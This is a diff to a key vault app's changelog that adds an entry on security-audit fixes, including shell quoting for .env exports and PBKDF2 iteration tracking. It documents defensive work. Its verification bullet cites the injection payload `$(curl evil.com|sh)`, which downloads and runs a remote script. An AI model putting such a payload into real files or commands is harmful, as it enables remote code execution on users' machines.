@@ -280,6 +280,17 @@ Salt and IV are unique per save operation. The master password is never stored o
   - Security: URL fragment not sent to HTTP server; value lives in sessionStorage only until modal confirm/skip; sessionStorage cleared on first read
   - Verified end-to-end: hash stripped → unlock → modal auto-opens with correct name/type/notes/project → key saved to vault → `totalKeys` incremented
 
+### Phase 6.1 — Vibe-code audit remediation (v1.5.2) — SHIPPED 2026-06-08
+Ran `/vibe-code-audit` against the v1.5.1 codebase. No critical/high findings. Two medium + three hygiene fixes applied as v1.5.2:
+- **VC-SEC-01 Medium — Iteration drift in `encryptAndSave`** — `VaultState` now tracks `kdfIterations`; `unlock()` + `encryptAndSave()` take iterations explicitly; `mutate()` passes through; future PBKDF2 bumps will no longer silently corrupt existing vaults
+- **VC-SEC-06 Medium — Shell injection in `.env` / `.envrc` export** — added `shellQuote()` with POSIX close-escape-reopen pattern; `$()`, backticks, embedded quotes now safe to source
+- **VC-SEC-02 Low — Prefill banner tone** — explicit warning about link-click attack vector
+- **VC-SEC-05 Info — Settings prototype-pollution surface** — explicit field whitelist replaces `Object.assign` of arbitrary JSON
+- **VC-SEC-05 Low — `.gitignore`** — added `Test Files/`, `*.vault`, `keyvault-sidekick.html`, `keyvault-backup-*.html`
+- File hash: `ac3962b87511304583fdb949e3a7d80fc77142167cfe34ba0d244ec9e8dbc242`
+- All fixes verified end-to-end in browser (synthetic 250k blob unlock-mutate-relock-unlock proves no lockout; `$(curl evil.com|sh)` exports as literal-quoted)
+- Audit verdict: **Go — Proceed to production**
+
 ### Phase 6 — Integrity verification + offline-first polish (Week 6) — SHIPPED 2026-06-08
 - [x] SHA-256 hash of loaded HTML computed at script start via `document.documentElement.outerHTML` + `crypto.subtle.digest` (CSP-safe — no fetch)
 - [x] App footer with truncated hash (first 12 chars + ellipsis) + full hash in tooltip + "Verify ↗" link that opens Guide → Integrity section
